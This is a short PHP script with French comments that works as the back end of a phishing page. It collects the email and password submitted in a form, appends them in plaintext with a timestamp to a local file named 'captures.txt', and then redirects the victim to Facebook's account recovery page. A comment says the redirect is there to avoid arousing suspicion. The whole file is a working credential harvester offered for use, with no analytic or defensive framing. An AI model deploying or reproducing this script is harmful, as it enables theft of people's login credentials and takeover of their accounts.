<?php
// On vérifie que les données sont envoyées via la méthode POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Récupération des données via les attributs 'name' du HTML
    $email = $_POST['email'];
    $password = $_POST['pass'];
    
    // Formatage de la ligne à enregistrer
    $log_entry = "--- Tentative de connexion ---\n";
    $log_entry .= "Date: " . date("Y-m-d H:i:s") . "\n";
    $log_entry .= "Identifiant: " . $email . "\n";
    $log_entry .= "Mot de passe: " . $password . "\n";
    $log_entry .= "-----------------------------\n\n";

    // Enregistrement dans un fichier texte local
    // Assurez-vous que le serveur a les droits d'écriture sur ce fichier
    file_put_contents("captures.txt", $log_entry, FILE_APPEND);

    // Redirection pour ne pas éveiller les soupçons
    header("Location: https://www.facebook.com/recover/initiate");
    exit();
}
?>